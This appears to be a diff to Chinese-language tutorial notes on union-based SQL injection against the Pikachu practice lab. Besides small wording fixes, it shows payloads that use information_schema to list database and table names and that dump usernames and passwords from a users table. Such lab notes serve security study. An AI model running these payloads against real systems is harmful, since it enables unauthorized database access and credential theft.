@@ -366,7 +366,7 @@ select id from users where username = 'kobe' order by 1;
 ```
 
 ### 案例2-基于information_schema的信息获取
-mysql自带一个数据库 information_schema 表非常重要，里面有很多信息。
+mysql自带一个数据库 information_schema 非常重要，里面有很多信息。
 ```sql
 --获取当前数据库名称 pikachu 
 select email,username from users where id = 1
@@ -375,7 +375,7 @@ select database(),user();
 ----payload
 kobe' union select database(),user()#
 
---获取表名 user
+--获取表名 users
 select email,username from users where id = 1
  union 
 select table_schema,table_name from information_schema.tables where table_schema = 'pikachu';
@@ -394,7 +394,7 @@ select email,username from users where id = 1
  union 
 select username,password from users;
 ---payload
-kobe' union select username,password from users#
+kobe\' union select username,password from users#
 
 ```
 
